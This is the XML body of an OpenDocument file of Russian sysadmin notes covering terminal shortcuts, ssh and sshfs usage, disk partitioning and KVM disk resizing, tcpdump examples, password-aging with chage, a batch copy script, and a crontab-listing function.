      <text:p text:style-name="P14"><text:span text:style-name="T1">Сочетания клавиш для управления выводом информации на экран. Вывод на экран:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + l Очистка окна терминала</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + s Заморозить терминал</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + q Продолжить работу терминала</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + c Прервать работу терминальной утилиты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + z Перевести работу терминальной утилиты в фоновый режим</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Ctrl + d Выйти из командной оболочки bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh user@host df -h</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">А такперезагрузить ее:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh user@host sudo reboot</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh user@host "`cat file.txt`"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ gvim scp://user@host//путь/к/файлу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh user@host cat /путь/к/файлу | xclip</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">А так можно скопировать вывод команды:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh user@host uname -a | xclip</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сравнивай удаленный и локальный файл без копирования. Похожий прием можно использовать для сравнения двух файлов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh user@host cat /путь/к/удаленному/файлу | diff /путь/к/лoкальному/файлу -</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">$ sudo apt-get install sshfs</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создать каталог для подключения «сетевого диска»:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ mkdir remote_files</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">И подключить его:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ sshfs user@host:/home/user ~/remote_files/</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">Теперь все файлы удаленного каталога /home/user будут видны в каталоге ~/remote_files/ и с ними можно работать, как с обычными.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh-copy-id user@host</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">При этом не обязательно копировать основной ключ, с помощью флага -i можно указать любой другой:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ssh-copy-id -i ~/my_key.pub user@host</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Host host</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ControlPath ~/.ssh/master-%r@%h:%p</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ControlMaster no</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">А затем создай соединение:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">$ ssh -MNf user@host</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">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1">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14"><text:span text:style-name="T1">sfdisk - программа для работы с таблицей разделов жесткого диска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sfdisk -d /dev/sda &gt; sda-table - Выполняет резервное копирование таблицы разбиения в файл </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sfdisk /dev/sda &lt; sda-table - Восстанавливает таблицу разбиения из файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sfdisk -d /dev/sda | sfdisk /dev/sdb - Копирует таблицу разбиения с одного диска на другой</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fdisk - <text:s/>программа для работы с таблицей разделов жесткого диска (устарела)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">e2label /dev/sda2 - посмотреть метку второго раздела</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">e2label /dev/sda2 my_lable_name - <text:s/>назначить метку my_lable_name второму разделу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">findfs LABEL=my_lable_name - ищем раздел по метке (например в /etc/fstab монтирование по метке)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs -t ext3 /dev/sdb1 - Создает файловую систему ext3 на разделе sba1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs -t ext3 -v -c /dev/sdb1 - Расширенная команда, выполняющая также поиск поврежденных блоков </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs.ext3 -с /dev/sdb1 - Создает файловую систему ext3 на разделе sba1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs.ext3 -с -L mypartition /dev/sdb1 - Создает файловую систему ext3 на разделе sba1 и добавляет разделу метку <text:s text:c="4"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dd if=/dev/scd0 of=name_file.iso bs=2048 - извлекаем образ iso с cd/dvd </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dd if=/dev/zero of=my_disk count=2048000 - Создаем заполненный нулями файл объемом 1 Гбайт</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">du -sh my_disk - Проверяем размер виртуальной файловой системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs -t ext3 my_disk - Создаем файловую систему на mydisk</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkdir /mnt/image <text:s/>- создаем пустой каталог</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mount -o loop my_disk /mnt/image - монтируем my_disk в пустой каталог </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cd /mnt/image <text:s/>- переходим в каталог /mnt/image</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkdir test - создаем каталог test </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cp /etc/hosts - копируем /etc/hosts в текущий каталог</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cd .. - переходим на уровень выше (выходим из текущего каталога)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">umount /mnt/image - отмонтмровать /mnt/image</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">HDD tools:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">gsmartcontrol - графическая программа проверки диска (SMART)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">smartmontools - консольная программа для проверки и контроля диска (SMART)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">parted - работа с таблицей разделов, аналог fdisk (еще есть partx)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">partman - разметка диска (поддерживает LVM) (Это предпочтительная утилита)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">partitioner - разметить диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fdisk - разметка диска </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ls -l /dev/disk/by-uuid - вот так узнать UUID жесткого диска для файла /etc/fstab</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">blkid - вот так узнать UUID жесткого диска для файла /etc/fstab</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat /proc/partitions - Все зарегистрированные разделы (Linux)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mount - Смонтированные файловые системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mount | column -t <text:s/>- Смонтированные файловые системы</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">df - Свободное пространство на дисках</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">KVM изменить размер диска / blockresize / domblklist / guests linux / mbr /gpt?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Изменение диска offline / qemu-img</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! не забываем делать backup</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">qemu-img resize vmdisk.qcow2 +10G - добавим 10Гб диску vmdisk.img</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Изменение диска online / blockresize</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">virsh blockresize &lt;domain&gt; &lt;path&gt; &lt;size&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>[--domain] &lt;строка&gt; <text:s/>имя домена, ID или UUID</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="3"/>[--path] &lt;строка&gt; <text:s/>Полный путь к блочному устройству</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>[--size] &lt;число&gt; <text:s/>Новый размер блочного устройства, кратный целому числу (по умолчанию в КиБ)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">virsh domblklist name_VM - узнаем какие диски есть у ВМ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">virsh blockresize name_VM /kvm/name_VM_disk.qcow2 100G - для ВМ (name_VM), изменим размер диска равный 100Гб</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Необходимые действия для гостя, при изменении диска, MBR диск / один раздел / fdisk:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! Не забываем делать backup </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! Внимание пример для одного диска с одним разделом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! fdisk -l - посмотреть доступные</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fdsik /dev/sda - редактируем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>: p - показываем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>Устр-во <text:s text:c="3"/>Загрузочный Start Конец Секторы Size Id Тип</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>/dev/sda1 <text:s/>* <text:s text:c="11"/>2048 14678015 14675968 <text:s text:c="2"/>7G 83 Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>: d - удаляем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>: n - создаем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>Do you want to remove the signature? [Y]es/[N]o: N - не удаляем сигнатуры</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>: a - ставим ставим загрузочный бит</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5"><text:s text:c="3"/>: w - применяем изменения</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">!!! после выхода из (fdisk) будет сказано что изменена таблица разделов и необходимо выполнить partprobe</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)# partprobe - выполняем просим систему перечитать таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)# resize2fs /dev/sda1 - выполняем изменения FS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Необходимые действия для гостя, при изменении диска, MBR диск / несколько разделов / parted:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! Не забываем делать backup </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! Внимание пример для одного диска и нескольких разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! fdisk -l - посмотреть доступные</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Пример (parted)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)# parted /dev/vda - открываем нужный диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="11"/>(parted) print free - покажем доступные <text:s/>разделы (диск /dev/vda)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>Number Start End Size Type File system Flags</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>1 32.3kB 4295MB 4295MB primary ext4 boot</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>2 4295MB 8590MB 4295MB primary linux-swap(v1)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>3 8590MB 107GB 98GB primary ext4</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="17"/>107GB 215GB 107GB Free Space</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="11"/>(parted) resizepart 3 - изменяем размер третьего раздела</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>End [107GB]? 215GB</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="11"/>(parted) quit - выходим из parted</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)#partprobe - выполняем просим систему перечитать таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)#resize2fs /dev/vda3 - <text:s/>выполняем изменения FS</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Необходимые действия для гостя, при изменении диска, GBT диск / несколько разделов / parted:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">!!! GPT Рассматривается схема с одним разделом (/dev/vdb1) на весь диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)#partprobe</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)#gdisk /dev/vdb</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>переходим в расширенный режим x</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>смещаем запись в конец диска e</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>выходим из расширенного режима m</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Command (? for help): d</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Using 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Command (? for help): n</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Partition number (1-128, default 1): [Enter]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>First sector (34-2147483614, default = 2048) or {+-}size{KMGTP}: [Enter]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Last sector (2048-2147483614, default = 2147483614) or {+-}size{KMGTP}: [Enter]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Current type is 'Linux filesystem'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Hex code or GUID (L to show codes, Enter = 8300): [Enter]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Changed type of partition to 'Linux filesystem'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>выходим с сохранением w</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)#partprobe</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">(name_VM)#resize2fs /dev/vdb1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">или</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">btrfs filesystem resize max /&lt;MOUNTPOINT&gt;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Смонтировать образ диска qcow2 в гипервизоре:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">modprobe nbd max_part=8</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">qemu-nbd --connect=/dev/nbd0 &lt;PATH-TO-IMAGE&gt;.qcow2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fdisk /dev/nbd0 -l</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">mount -o ro /dev/nbd0p1 /mnt/ext0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">umount /mnt/ext0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">qemu-nbd --disconnect /dev/nbd0</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">rmmod nbd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump / снифер / sniffer</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Примеры использования tcpdump:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i eth0 # слушаем интерфейс eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump port 80 # слушаем 80 порт <text:s text:c="12"/></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump host google.com # слушаем трафик с хоста google.com</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -n -i eth0 icmp # Ловим пакеты icmp (ping pong)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump | grep -v ssh # поиск пакетов исключая пакеты ssh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -n -i eth0 net 192.168.1.15 # трафик с/на IP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -n -i eth0 net 192.168.1.0/24 # трафик с/в сеть</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод с записью в файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i eth0 -w traffic.eth0 # Информация о трафике записывается в бинарный файл traffic.eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i eth0 -s 0 -w traffic.eth0 # Запись + загрузка в бинарный файл</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">tcpdump -r traffic.eth0 # Читаем из файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i eth0 -X port \(110 or 143\) # Проверка pop и imap на безопасность</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i eth0 -s 0 -A port 80 | grep GET # (-s 0 весь пакет, -A для ASCII)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -npi iface_name ether src MAC-address # узнать MAC устройства iface_name -имя интерфейса MAC-address -мак адрес устройства</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -vvv -s 0 -l -n port 53 # показываем DNS трафик</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -nl -i bge0 not port ssh and src \(192.168.16.121 or 192.168.16.54\)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -n -i eth1 net 192.168.16.121 # Выборка входящий/исходящий по одному IP адресу</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -n -i eth1 net 192.168.16.0/24 # Выборка входящий/исходящий по адресу сети</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -l &gt; dump &amp;&amp; tail -f dump # Вывод через буфер</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i rl0 -w traffic.rl0 # Писать заголовки в бинарный файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -i rl0 -s 0 -w traffic.rl0 # Писать в бинарный фйл полные пакеты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tcpdump -r traffic.rl0 # Прочитать из файла (так-же для ethereal</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">tcpdump -i eth0 -s 0 -A port 80 | grep GET # -s 0 для полных пакетов, -A для ASCII</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">"""</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">from pytube import YouTube</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">video_url = "https://www.youtube.com/watch?v=hgI0p1zf31k"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">yt = YouTube(video_url)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">stream = yt.streams.get_highest_resolution()</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">output_path = "path/to/output/directory/"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">stream.download(output_path)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">"""</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Как заставить пользователя изменить пароль при следующем входе в систему?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Использование команды passwd - sudo passwd --expire [username]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Использование команды chage - sudo chage --lastday 0 [username]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Заставляем пользователя менять пароль каждые 90 дней - sudo chage -M 90</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Задаем срок жизни учетной записи (до 12 июня 2023) - sudo chage -E 2023-06-12 serg</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Сколько времени на смену пароля?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">В примере даем Борису 10 дней на смену пароля с момента как пароль заэкспайрился</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo chage -I 10 boris</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Уведомление о смене пароля заранее. Через 25 дней истекает срок годности пароля Бориса - sudo chage -W 25 boris</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Защищаемся от частой смены паролей пользователя. Минимальное количество дней между сменой паролей - sudo chage -m 25 boris</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Удалить ограничение в днях - sudo chage -m 0 sergey</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Скрипт / копирование файла из сетевого хранилища в каталог c:\users\public\desktop\ на разные ПК. Как оно работает:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">c:\users\public\desktop\ ---- файлы из этого каталога будут видны всем пользователям на данном пк</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chcp 1251 &gt;nul <text:s/>--- нужно для решение проблемы с кодировкой</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">set listfile=host.txt --- список компов (комп = одна строка)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">for /f "tokens=1" %%i in (%listfile%) do call :procedure %%i - цикл (проходит по списку)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:procedure</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">copy "\\fileserv\files\file1.lnk" "\\%1\c$\users\public\Desktop\" - выполнение команды</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Создаем файл copy_file_for_desktops_users.cmd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chcp 1251 &gt;nul</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">set listfile=host.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">for /f "tokens=1" %%i in (%listfile%) do call :procedure %%i</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">:procedure</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">copy "\\fileserv\files\file1.lnk" "\\%1\c$\users\public\Desktop\"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Создаем файл host.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Comp 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Comp 2</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Comp 3</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Comp 4</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Comp 5</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Comp 6</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Цвета вывода</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">red='\e[0;31m'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">RED='\e[1;31m'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">green='\e[0;32m'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">GREEN='\e[1;32m'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">NC='\e[0m'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s/># Определение функции вывода задач cron всех пользователей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">function allcrontab() {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="5"/>for user in $(cut -d':' -f1 /etc/passwd); do</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="10"/>usercrontab=$(crontab -l -u ${user} 2&gt;/dev/null)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="10"/>if [ -n "${usercrontab}" ]; then</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>echo -e "${RED}====== Start crontab for user ${NC}${GREEN}${user}${NC} ${RED}======${NC}"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>crontab -l -u ${user} | sed '/ *#/d; /^ *$/d'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="15"/>echo -e "${RED}====== End crontab for user ${NC}${GREEN}${user}${NC} ${RED}========${NC}\n"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="10"/>fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="5"/>done</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Zeek (https://zeek.org/) - это мощная структура сетевого анализа, которая сильно отличается от типичных IDS, которые вы, возможно, знаете.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SELECT * FROM hosts WHERE host like '%name%';</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SELECT * FROM hosts WHERE name like '%name%';</text:span></text:p>
